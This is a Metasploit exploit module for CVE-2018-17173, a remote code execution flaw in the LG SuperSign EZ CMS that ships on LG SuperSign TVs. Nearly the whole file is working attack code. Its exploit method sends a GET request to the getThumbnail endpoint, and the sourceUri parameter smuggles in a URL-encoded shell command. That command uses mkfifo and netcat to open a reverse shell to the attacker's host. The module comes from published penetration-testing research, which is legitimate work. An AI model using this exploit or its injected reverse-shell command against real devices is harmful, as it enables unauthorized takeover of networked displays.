##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
        'Name'        => 'LG Supersign EZ CMS RCE',
        'Description' => %q{
            		  LG SuperSignEZ CMS, that many LG SuperSign TVs have builtin, is prone
                          to remote code execution due to an improper parameter handling
        },
        'Author'      => ['Alejandro Fanjul'],
        'References'  =>
          [
            [ 'CVE', '2018-17173' ],
            [ 'URL', 'https://mamaquieroserpentester.blogspot.com/2018/09/lg-supersign-rce-to-luna-and-back-to.html']
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'unix',
        'Privileged'     => false,
        'DefaultOptions' =>
          {
            'PAYLOAD' => 'cmd/unix/reverse_netcat'
          },
        'Arch'           => ARCH_CMD,
        'Payload'        =>
          {
            'Compat' =>
              {
                'PayloadType' => 'cmd',
                'RequiredCmd' => 'netcat'
              }
          },
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Sep 21 2018'
      )
     )
     register_options(
      [
         OptString.new('RPORT',[true,'Target port','9080'])
      ], self.class)

  end


  def exploit
    lhost=datastore['LHOST']
    lport=datastore['LPORT']
    #uri = target_uri.path
    cmd = Rex::Text.uri_encode(payload.encoded)
    connect
    res = send_request_raw({
        'method'=>'GET',
        'uri'=>"/qsr_server/device/getThumbnail?sourceUri='%20-;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+lhost+"%20"+lport.to_s+"%20%3E%2Ftmp%2Ff;'&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150"

    })
    handler
    disconnect

  end

end